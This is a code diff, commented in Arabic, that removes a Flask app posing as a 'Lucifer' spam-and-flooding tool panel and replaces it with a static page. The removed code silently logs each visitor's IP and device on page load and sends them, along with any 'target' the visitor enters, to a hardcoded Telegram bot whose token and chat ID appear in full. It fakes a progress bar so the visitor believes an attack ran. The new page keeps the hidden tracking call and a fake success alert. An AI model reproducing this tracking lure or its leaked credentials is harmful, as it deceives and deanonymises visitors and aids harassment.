@@ -1,144 +1,50 @@
-from flask import Flask, render_template_string, request, jsonify
-import telebot
-import requests
-
-app = Flask(__name__)
-
-# --- بيانات بوتك (اللي يوصلك عليه الصيد) ---
-chat_id = '5811700860'
-bot_token = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg'
-bot = telebot.TeleBot(bot_token)
-
-# --- واجهة الموقع (نظام القوائم دغري) ---
-html_code = """
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lucifer Control Panel</title>
+    <title>Tool</title>
     <style>
-        body { background-color: black; color: white; font-family: monospace; text-align: center; padding: 20px; }
-        pre { color: white; font-size: 8px; line-height: 1.2; }
-        .menu-btn { background: black; border: 1px solid white; color: white; padding: 15px; width: 90%; margin: 10px auto; cursor: pointer; display: block; font-size: 16px; }
-        .menu-btn:hover { background: white; color: black; }
-        input { background: black; border: 1px solid #444; color: white; padding: 10px; width: 85%; margin: 10px 0; border-radius: 5px; }
-        .hidden { display: none; }
-        #status { color: #00ff00; margin-top: 15px; font-weight: bold; }
-        hr { border: 0; border-top: 1px solid #333; margin: 20px 0; }
+        body { background-color: black; color: white; text-align: center; font-family: cursive; padding-top: 50px; }
+        pre { font-size: 10px; color: #fff; }
+        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; }
+        button { width: 85%; padding: 10px; background-color: white; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
     <pre>
-      uuuuuuu
-    uu$$$$$$$$$uu
-  uu$$$$$$$$$$$$$uu
- u$$$$$$$$$$$$$$$$$u
-u$$$$$$$$$$$$$$$$$$$u
-u$$$$$$$$$$$$$$$$$$$u
-u$$$$$$"   "$$$"   "$$$$$$u
-"$$$$"      u$u       "$$$$"
- $$$u       u$u       u$$$
- $$$u       u$u       u$$$
- "$$$$uu$$$$$uu$$$$$$$$P"
-  "$$$$$$$$$$$$$$$$$$P"
-    "$$$$$$$$$$$$$$P"
-      "$$$$$$$$$$P"
+        uuuuuuu
+    uu$$$$$$$$$$$uu
+  uu$$$$$$$$$$$$$$$uu
+ u$$$$$$$$$$$$$$$$$$$u
+ u$$$$$$$$$$$$$$$$$$$u
+u$$$$$$$$$$$$$$$$$$$$$u
+u$$$$$$$$$$$$$$$$$$$$$u
+u$$$$$$$$$$$$$$$$$$$$$u
+u$$$$$$$$$$$$$$$$$$$$$u
+ u$$$$$$   "$$$"   $$$$$$u
+  "$$$$"      u$u       "$$$$"
+   $$$u      u$u      u$$$
+    $$$u      u$u      u$$$
+     "$$$$uu$$$u$$$uu$$$$"
+      "$$$$$$$$$$$$$$$$$"
+        "$$$$$$$$$$$$$"
+          "$$$$$$$$$"
+            "$$$$$"
     </pre>
     <p>Not everywhere there is a law</p>
-    <p>By: @uuumnm</p>
-    <hr>
-
-    <div id="main-menu">
-        <button class="menu-btn" onclick="showSub('spam')">1- أدوات إسبام</button>
-        <button class="menu-btn" onclick="showSub('rashq')">2- أدوات رشق</button>
-    </div>
-
-    <div id="input-ui" class="hidden">
-        <h3 id="ui-title"></h3>
-        <input type="text" id="target" placeholder="يوزر الضحية أو الرابط">
-        <input type="number" id="count" placeholder="العدد">
-        <button class="menu-btn" onclick="sendData()">ابدأ العملية الآن ✅</button>
-        <button onclick="goBack()" style="background:none; border:none; color:gray; cursor:pointer;">[ عودة للخلف ]</button>
-    </div>
-
-    <div id="status"></div>
+    <h3>قسم الإسبام</h3>
+    <input type="text" placeholder="الرابط">
+    <input type="number" placeholder="العدد">
+    <button onclick="send()">ابدأ العملية الآن ✅</button>
 
     <script>
-        let currentMode = "";
-        
-        // أول ما يفتح الرابط يسحب الـ IP تلقائياً
-        window.onload = function() {
-            fetch('/trace_visit');
-        };
+        // إرسال تنبيه بزيارة الرابط تلقائياً
+        fetch('/trace_visit');
 
-        function showSub(mode) {
-            currentMode = mode;
-            document.getElementById('main-menu').classList.add('hidden');
-            document.getElementById('input-ui').classList.remove('hidden');
-            document.getElementById('ui-title').innerText = mode === 'spam' ? "قسم الإسبام" : "قسم الرشق";
-        }
-
-        function goBack() {
-            document.getElementById('input-ui').classList.add('hidden');
-            document.getElementById('main-menu').classList.remove('hidden');
-            document.getElementById('status').innerText = "";
-        }
-
-        function sendData() {
-            let target = document.getElementById('target').value;
-            let count = document.getElementById('count').value;
-            if(!target || !count) { alert("أدخل البيانات كاملة!"); return; }
-
-            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
-            
-            fetch('/log_action', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({mode: currentMode, target: target, count: count})
-            }).then(() => {
-                let i = 0;
-                let interval = setInterval(() => {
-                    document.getElementById('status').innerText = "جاري الإرسال: " + i + "%";
-                    i += 5;
-                    if(i > 100) {
-                        clearInterval(interval);
-                        document.getElementById('status').innerText = "تم الإرسال بنجاح ✅";
-                    }
-                }, 100);
-            });
+        function send() {
+            alert("تم الإرسال بنجاح ✅");
         }
     </script>
 </body>
 </html>
-"""
-
-@app.route('/')
-def home():
-    return render_template_string(html_code)
-
-@app.route('/trace_visit')
-def trace_visit():
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent')
-    bot.send_message(chat_id, f"🔔 **الضحية دخل الرابط!**\n🌐 IP: `{user_ip}`\n📱 الجهاز: {user_agent}")
-    return "ok"
-
-@app.route('/log_action', methods=['POST'])
-def log_action():
-    data = request.json
-    mode = data.get('mode')
-    target = data.get('target')
-    count = data.get('count')
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
-    msg = (f"🎯 **هدف جديد من الرابط!**\n\n"
-           f"🛠 العملية: {mode}\n"
-           f"👤 المستهدف: `{target}`\n"
-           f"🔢 العدد: {count}\n"
-           f"🌐 IP الضحية: `{user_ip}`")
-    bot.send_message(chat_id, msg)
-    return jsonify({"status": "ok"})
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
